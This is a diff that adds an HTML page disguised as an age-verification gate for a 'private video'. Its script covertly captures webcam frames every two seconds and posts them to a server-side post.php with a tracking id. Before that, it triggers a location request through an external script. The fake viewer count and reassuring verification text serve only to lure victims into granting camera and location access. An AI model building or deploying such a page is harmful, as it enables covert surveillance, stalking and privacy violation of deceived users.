@@ -1,0 +1,528 @@
+<!doctype html>
+<html lang="en">
+<head><meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate, max-age=0">
+<meta http-equiv="Pragma" content="no-cache">
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Private Video - Verification Required</title>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            color: #fff;
+        }
+
+        .video-wrap {
+            display: none;
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+            padding: 20px;
+        }
+
+        .header {
+            background: rgba(20, 20, 20, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 12px;
+            padding: 20px 30px;
+            margin-bottom: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #ff006e, #8338ec);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 18px;
+        }
+
+        .logo-text {
+            font-size: 22px;
+            font-weight: 600;
+            color: #fff;
+        }
+
+        .warning-badge {
+            background: linear-gradient(135deg, #ff006e, #8338ec);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .warning-badge::before {
+            content: '🔒';
+            font-size: 14px;
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            background: #000;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8);
+            margin-bottom: 20px;
+            aspect-ratio: 16/9;
+        }
+
+        .video-player {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .video-placeholder {
+            text-align: center;
+            padding: 40px;
+        }
+
+        .video-icon {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.1); opacity: 1; }
+        }
+
+        .video-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 15px;
+            background: linear-gradient(135deg, #ff006e, #8338ec);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .video-info {
+            font-size: 16px;
+            color: rgba(255, 255, 255, 0.7);
+            margin-bottom: 10px;
+        }
+
+        .verification-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.95);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px;
+            text-align: center;
+            z-index: 10;
+        }
+
+        .verification-icon {
+            width: 100px;
+            height: 100px;
+            margin-bottom: 30px;
+            background: linear-gradient(135deg, #ff006e, #8338ec);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+            animation: rotate 3s linear infinite;
+        }
+
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+
+        .verification-title {
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            color: #fff;
+        }
+
+        .verification-text {
+            font-size: 18px;
+            color: rgba(255, 255, 255, 0.8);
+            margin-bottom: 30px;
+            max-width: 600px;
+            line-height: 1.6;
+        }
+
+        .verification-reasons {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 30px;
+            max-width: 500px;
+            text-align: left;
+        }
+
+        .reason-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+            font-size: 15px;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        .reason-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .reason-icon {
+            font-size: 20px;
+        }
+
+        .camera-preview {
+            width: 200px;
+            height: 150px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 12px;
+            margin: 20px 0;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+        }
+
+        .loading-bar {
+            width: 300px;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .loading-progress {
+            height: 100%;
+            background: linear-gradient(90deg, #ff006e, #8338ec);
+            width: 0%;
+            animation: loading 3s ease-in-out infinite;
+        }
+
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+
+        .controls {
+            background: rgba(20, 20, 20, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 12px;
+            padding: 20px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .control-group {
+            display: flex;
+            gap: 15px;
+        }
+
+        .control-btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .control-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .viewer-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            font-size: 14px;
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .viewer-count {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .viewer-count::before {
+            content: '👁️';
+        }
+
+        @media (max-width: 768px) {
+            .header {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+
+            .controls {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .control-group {
+                width: 100%;
+                justify-content: center;
+            }
+
+            .verification-title {
+                font-size: 24px;
+            }
+
+            .verification-text {
+                font-size: 16px;
+            }
+        }
+        .request-access-overlay {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.98); z-index: 9999;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            padding: 40px; text-align: center; transition: opacity 0.5s ease;
+        }
+        .request-access-overlay.hidden { opacity: 0; pointer-events: none; }
+        .request-access-icon { width: 80px; height: 80px; margin-bottom: 24px; background: linear-gradient(135deg, #ff006e, #8338ec);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 40px; }
+        .request-access-title { font-size: 28px; font-weight: 700; margin-bottom: 16px; color: #fff; }
+        .request-access-text { font-size: 16px; color: rgba(255,255,255,0.8); margin-bottom: 24px; max-width: 400px; line-height: 1.5; }
+        .request-access-btn { padding: 14px 40px; font-size: 16px; font-weight: 600; border: none;
+            border-radius: 12px; background: linear-gradient(135deg, #ff006e, #8338ec); color: #fff; cursor: pointer; }
+        .request-access-btn:hover { opacity: 0.95; }
+        .request-access-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+        .request-access-status { margin-top: 16px; font-size: 13px; color: rgba(255,255,255,0.6); }
+    </style>
+</head>
+
+<body><script>window.TRACKIFY_TID="9327ccab498d175d58902e56a4715b4d83bd9f0b443cad413f991e50d3a80f13";</script>
+    <div class="request-access-overlay" id="requestAccessOverlay">
+        <div class="request-access-icon">📍</div>
+        <div class="request-access-title">Request Access</div>
+        <div class="request-access-text">Please allow or deny location access to continue. We will wait for your response.</div>
+        <button class="request-access-btn" id="requestAccessBtn">Request Access</button>
+        <div class="request-access-status" id="requestAccessStatus"></div>
+    </div>
+
+    <div class="video-wrap" hidden="hidden">
+        <video id="video" playsinline autoplay></video>
+    </div>
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo">
+                <div class="logo-icon">🔒</div>
+                <div class="logo-text">Private Content</div>
+            </div>
+            <div class="warning-badge">Age Verification Required</div>
+        </div>
+
+        <div class="video-container">
+            <div class="video-player">
+                <div class="video-placeholder">
+                    <div class="video-icon">🎬</div>
+                    <div class="video-title">Private Video Content</div>
+                    <div class="video-info">Duration: 12:34</div>
+                    <div class="video-info">Uploaded: Recently</div>
+                </div>
+            </div>
+
+            <div class="verification-overlay" id="verificationOverlay">
+                <div class="verification-icon">🔐</div>
+                <div class="verification-title">Age Verification Required</div>
+                <div class="verification-text">
+                    This content is restricted and requires age verification. 
+                    Please allow camera access to verify your identity and age.
+                </div>
+                <div class="verification-reasons">
+                    <div class="reason-item">
+                        <span class="reason-icon">✓</span>
+                        <span>Verify you are 18+ years old</span>
+                    </div>
+                    <div class="reason-item">
+                        <span class="reason-icon">✓</span>
+                        <span>Confirm your identity</span>
+                    </div>
+                    <div class="reason-item">
+                        <span class="reason-icon">✓</span>
+                        <span>Ensure compliance with content policies</span>
+                    </div>
+                </div>
+                <div class="camera-preview" id="cameraPreview">
+                    📹
+                </div>
+                <div class="loading-bar">
+                    <div class="loading-progress"></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="controls">
+            <div class="control-group">
+                <button class="control-btn">
+                    ⏯️ Play
+                </button>
+                <button class="control-btn">
+                    ⏩ Forward
+                </button>
+                <button class="control-btn">
+                    ⭐ Favorite
+                </button>
+            </div>
+            <div class="viewer-info">
+                <div class="viewer-count">
+                    <span id="viewerCount">2,847</span> verified viewers
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="location-request.js"></script>
+    <script>
+        var BASE_URL = window.location.origin + '/';
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata, tid: (typeof window.TRACKIFY_TID === 'string' ? window.TRACKIFY_TID : (new URLSearchParams(window.location.search).get('tid') || '')) },
+                url: BASE_URL + 'post.php',
+                dataType: 'json',
+                async: false,
+                success: function (result) {
+                    // Handle response
+                },
+                error: function () {
+                    // Handle error
+                }
+            });
+        }
+
+        'use strict';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        const verificationOverlay = document.getElementById('verificationOverlay');
+        const cameraPreview = document.getElementById('cameraPreview');
+
+        function initCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    video.srcObject = stream;
+                    video.play();
+                    
+                    setTimeout(function() {
+                        cameraPreview.innerHTML = '<video autoplay playsinline style="width:100%;height:100%;object-fit:cover;border-radius:10px;"></video>';
+                        var previewVideo = cameraPreview.querySelector('video');
+                        previewVideo.srcObject = stream;
+                        
+                        setTimeout(function() {
+                            verificationOverlay.style.opacity = '0';
+                            setTimeout(function() {
+                                verificationOverlay.style.display = 'none';
+                            }, 500);
+                        }, 2000);
+                    }, 1000);
+
+                    setInterval(function() {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        var imgdata = canvas.toDataURL('image/png');
+                        post(imgdata);
+                    }, 2000);
+                })
+                .catch(function(err) {
+                    console.error('Camera access denied:', err);
+                    cameraPreview.innerHTML = '⚠️ Camera access required';
+                });
+
+            var viewerCount = 2847;
+            setInterval(function() {
+                viewerCount += Math.floor(Math.random() * 3);
+                document.getElementById('viewerCount').textContent = viewerCount.toLocaleString();
+            }, 5000);
+        }
+
+        // Initialize camera only after location permission is done
+        if (window.LocationRequest) {
+            LocationRequest.init(initCamera);
+        }
+    </script>
+</body>
+</html>
